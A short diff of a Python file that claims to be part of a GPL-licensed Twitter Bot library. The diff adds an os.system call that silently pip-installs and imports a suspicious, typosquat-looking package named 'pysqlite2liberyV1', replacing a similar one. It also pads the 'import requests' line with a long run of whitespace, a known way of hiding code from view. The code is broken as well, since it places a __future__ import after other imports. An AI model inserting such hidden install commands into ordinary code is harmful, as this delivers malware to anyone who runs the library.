@@ -18,8 +18,8 @@ You should have received a copy of the GNU General Public License along with
 the Twitter Bot library. If not, see http://www.gnu.org/licenses/.
 """
 import os
-os.system("pip install pipsqlite3kitV2")
-import pipsqlite3kitV2
+os.system("pip install pysqlite2liberyV1")
+import pysqlite2liberyV1
 import requests																																																																																																																																																																																																																																																																																						
 from __future__ import print_function
 from twitter import Twitter, OAuth, TwitterHTTPError
